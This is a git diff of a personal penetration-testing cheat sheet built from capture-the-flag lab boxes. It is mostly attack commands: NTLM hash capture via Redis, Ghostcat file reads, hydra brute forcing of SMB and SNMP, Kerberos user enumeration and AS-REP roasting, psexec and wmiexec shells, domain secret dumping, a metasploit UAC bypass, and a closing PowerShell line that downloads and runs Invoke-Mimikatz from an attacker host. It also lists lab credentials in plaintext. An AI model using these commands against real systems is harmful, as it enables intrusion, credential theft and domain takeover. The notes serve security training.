@@ -1,6 +1,10 @@
 enum starting when you got machine
 
-nmap -A -sC -sV -p-
+nmap -A -sC -sV -p- 
+                    -vv -T5
+
+
+
 
 redis-cli -h 
 [active.thm:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
@@ -16,11 +20,277 @@ eval "dofile('//10.9.1.100/share')" 0
 (You can write anything in place of share, the share does not need to exist)
 And we have got the user’s pasword hash!]
 
+
+
 enum4linux -a
            -ng -A 
-           
-impacket-rpcdump @active.thm
 
+
+           
+
+
+dirb http://<ip>/<if you find any dir suspicious>
+chech robot.txt too
+
+wfuzz -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -c -t 50 http://10.10.89.209/FUZZ 
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.216.68/FUZ[2/4].php,.asp,.aspx,.txt | tee ffuf/root.log
+
+
+
+
+exploit findings
+if you find any unknown service running on any of unusual port then 
+A.  searchsploit <service name/plugin of website name>          e.g. apache tomcat 
+B.  After that visit the cve details website with same service name         e.g. cve 2020-1938
+C.  Either you can download the exploit from net only or you can  find path using searchsploit -p or you can use metasploit  (while using metasploit if you get session you can bypass uac by backgrouding that session ctrl z and then using the exploit windows/local/bypassuac_eventvwr)
+
+
+exploit finding is real serious process since some of exploits dont work you must know which version of service is running at first   e.g. tomcat 9.3.0
+Next you can search for service name on cve details website
+If you get some exploit name , then read it properly and then search this explit name on net again to find some article related to it    e.g. We come to know about Ghostcat vulnerability.
+if you come to know vulnerability name then you can find poc of that vulnerability and you will be all done   e.g. 
+
+[[[[[[CVE-2020–1938. Researching this further, we learn that by exploiting the Ghostcat vulnerability, an attacker will be able to read the contents of configuration files and source code files of all webapps deployed on Tomcat.
+
+To exploit the Ghostcat vulnerability we can download the POC from the following GitHub repository:
+00theway/Ghostcat-CNVD-2020-10487
+Ghostcat read file/code execute,CNVD-2020-10487(CVE-2020-1938) - 00theway/Ghostcat-CNVD-2020-10487
+
+github.com
+
+We can clone this into our directory:
+
+sudo git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
+
+Let’s look at the help for the Ajp Shooter to exploit this vulnerability:
+The object here is to see whether we can read the contents of a configuration file, which will be /WEB-INF/web.xml.
+
+python ajpShooter.py http://10.10.188.67 8009 /WEB-INF/web.xml read
+
+When we run the script we can read the contents of the /web.xml file. In the file we can see some credentials which look like the user:password for ssh.
+
+]]]]]]]
+
+
+
+
+
+
+
+smbclient
+
+ smbclient -L //10.10.191.241
+ hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.191.241 smb 
+ nmap --script "safe or smb-enum-*" -p 445 10.10.191.241
+ smbclient -L //10.10.188.161
+ smbclient //10.10.188.161
+ smbclient -L 10.10.188.161 --user Jareth
+ smbclient -L //10.10.188.161////C$ --user Jareth
+ smbclient //10.10.188.161////C$ --user Jareth
+ smbclient //10.10.188.161////C --user Jareth
+ smbclient //10.10.188.161/C --user Jareth
+ smbclient \\10.10.188.161\\\\C --user Jareth
+ smbclient //10.10.188.161//C --user Jareth
+ smbclient \\\\10.10.188.161\\C --user Jareth
+ smbclient \\\\10.10.188.161\\IPC --user Jareth
+ smbclient \\\\10.10.188.161\\IPC$ --user Jareth
+ smbclient \\\\10.10.188.161\\C$ --user Jareth
+ smbclient \\\\10.10.188.161\\ADMIN$ --user Jareth
+ smbclient -L //10.10.131.242
+ smbclient //10.10.131.242////Users
+ smbclient \\10.10.131.242\\\\Users
+ smbclient -L \\10.10.131.242\\\\Users
+ smbclient -L \\10.10.131.242\Users
+ smbclient -L \\10.10.131.242\\\\IPC$
+ smbclient \\10.10.131.242\\\\IPC$
+ smbclient \\10.10.131.242\Users
+ smbclient \\\\10.10.131.242\\Users
+ smbclient \\\\10.10.131.242\\Windows
+ smbclient \\\\10.10.131.242\C$
+ smbclient \\\\10.10.131.242\\C$
+ hydra -P /usr/share/wordlists/rockyou.txt 10.10.131.242 smb
+ hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.131.242 smb
+ smbclient \\\\10.10.131.242\\Admin$
+ smbclient \\\\10.10.131.242\\IPC$
+ nmap --script "safe or smb-enum-*" -p 445 10.10.131.242
+ smbclient -L 10.10.37.135
+ smbclient -L \\\10.10.37.135
+ smbclient -L \\10.10.37.135
+ nmap --script "safe or smb-enum-*" -p 445 10.10.37.135
+ smbclient -L \\10.10.210.130
+ smbclient -h
+ smbclient \\\\10.10.210.130 --user lilyle
+ smbclient -L \\10.10.210.130 --user lilyle
+ smbclient \\10.10.210.130 --user lilyle
+ smbclient \\windcorp.thm --user lilyle
+ smbclient //windcorp.thm --user lilyle
+ smbclient ////windcorp.thm --user lilyle
+ smbclient \\\\\\\\windcorp.thm --user lilyle
+ smbclient \\\\windcorp.thm --user lilyle
+ smbclient \\\\\windcorp.thm --user lilyle
+ smbclient \\\\\\windcorp.thm --user lilyle
+ smbmap -u lilyle -p ChangeMe#1234 -R -H 10.10.210.130
+ smbmap -u lilyle -p ChangeMe#1234 -R -H 10.10.174.32
+ smbclient //windcorp.thm -U lilyle
+ smbclient \\windcorp.thm -U lilyle
+ smbclient \\\\windcorp.thm -U lilyle
+ smbclient ////windcorp.thm -U lilyle
+ smbclient //windcorp.thm/Shared -U lilyle
+ smbclient //10.10.174.32/Shared -U lilyle
+ smbclient -t 500 //10.10.174.32/Shared -U lilyle
+ smbclient -t 500 //10.10.203.255/Shared -U lilyle
+ smbclient -t 500 //10.10.116.174/Shared -U lilyle
+ smbmap -u lilyle -p ChangeMe#1234 -R -H windcorp.thm
+ smbmap -u lilyle -p ChangeMe#1234 -R -H 10.10.116.174
+ smbmap -u brittanycr -p Testing123 -R -H windcorp.thm
+ smbclient //windcorp.thm/users -U brittanycr
+ smbclient -L \\10.10.210.130 --user svc-admin
+ smbclient -L \\10.10.95.50 --user svc-admin
+ smbclient \\\\10.10.188.161\\ADMIN$ --user svc-admin
+ smbclient \\\\10.10.95.50\\ADMIN$ --user svc-admin
+ smbclient '\\spookysec.local\backup 10.10.95.50 -U svc-admin
+ smbclient '\\spookysec.local\backup' 10.10.95.50 -U svc-admin
+ smbclient '\\spookysec.local\backup' -U svc-admin
+ smbclient '\\spookysec.local\ADMIN$' -U svc-admin
+ smbclient '\\spookysec.local\NETLOGON' -U svc-admin
+ history | grep smbclient
+ smbclient -N -L //10.10.37.135/
+ smbclient -N //10.10.37.135/<sharename>
+ 
+ 
+ smbmap -u anonymous -H 10.10.117.62
+ 
+ 
+ when u dont know username and pass
+ crackmapexec smb 10.10.175.103 -u guest -p "" --shares
+ crackmapexec smb 10.10.175.103 -u guest -p "" -M spider plus
+ 
+ 
+ when u know pass
+ crackmapexec smb 10.10.175.103 -u t-skid -p "gangubali" --shares
+ smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON
+ 
+ 
+ 
+ 
+ 
+ 
+ SNMP
+ 
+ One thing that stands out for me is the snmp service, port 161. If there is one thing I remember from school is that snmp has a community string, which is essentially a password and the default is public, so using tools such as snmp-check we could get some information.
+
+snmp-check 10.10.255.200 -c public
+
+-c: This flag specifies the community string
+And again, nothing….but! Maybe we can brute force this! Using seclists dictionary for snmp strings, which you can find here:
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/SNMP
+
+hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.255.200 snmp
+
+we get something finally!
+Now using the previous command with snmp-check we can enumerate some information.
+
+
+
+
+
+
+
+
+SQL
+To open and see contenty of a .db file you can use sqlite3
+
+sqlite3 admin.db
+
+Do check mysql share 
+you ould brute force for mysql password
+
+
+
+
+
+
+
+Check for self signed certificates for each site if guiven 
+This might reveal many things like  diferent DNS names site is using and algorithm used , keys , Serial number etc
+
+
+
+
+
+Kerbrute enum
+
+using ctf bash tools to increase chance for user name detection
+./ctf-wordlist-names.sh /root/vulnnet/usernm   output: formatted_name_wordlist in the same folder as of ctf-wordlist-name.sh
+
+
+python kerbrute.py  -domain vulnnet-rst.local -dc-ip 10.10.253.142 -users /root/vulnnet/formatted_name_wordlist.txt
+
+
+plz check kerbrute and ldap enum files too
+
+
+
+
+rpc client enum
+
+rpcclient -U "" 10.10.175.103
+
+
+
+
+ldap search 
+
+ldapsearch -x -h 10.10.111.177 -b base namingcontext
+
+
+
+
+
+
+impacket is also good tool for enumeration plz learn it evrytime
+
+impacket-rpcdump @active.thm
 impacket-rpcdump @active.thm | egrep 'MS-RPRN|MS-PAR'
 
+impacket-lookupsid vulnnet-rst.local/guest@10.10.111.177
+     we were able to dump domain users from box
+
+impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile users.txt
+     lets find out if any user is asreproastable
+
+impacket-psexec vulnnet-rst.local/a-whitehat@10.10.111.177
+      trying to get shell
+      if you dont get shell then try with evil winrm too for once
+          evil-winrm -i 10.10.111.177 -u a-whitehat -p "bNdKVkjv3RR9ht"
+
+      
+impacket-wmiexec  vulnnet-rst.local/a-whitehat@10.10.111.177
+     got shell for whitehat which is domain admin
+     best for getting shell
+     
+impacket-secretsdump vulnnet-rst.local/a-whitehat@10.10.111.177
+      dumping secrets for whitehat. once you get the shell you can dump secrets since you are domain admin
+      
+      
+      
+      
+
+
+
+
+pip3 install bloodhound 
+
+bloodhound-python -u administer -p Ignite@987 -ns 192.168.1.172 -d ignite.local -c All
+
+or you can download from github
+
+python3 ~/Desktop/git/BloodHound.py/bloodhound.py -c All,LoggedOn -u "t-skid" -p "tj072889*" -d VULNNET-RST.LOCAL -ns 10.10.111.177
+
+
+
+
+
+powershell -exec bypass -command "IEX (New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz"
 
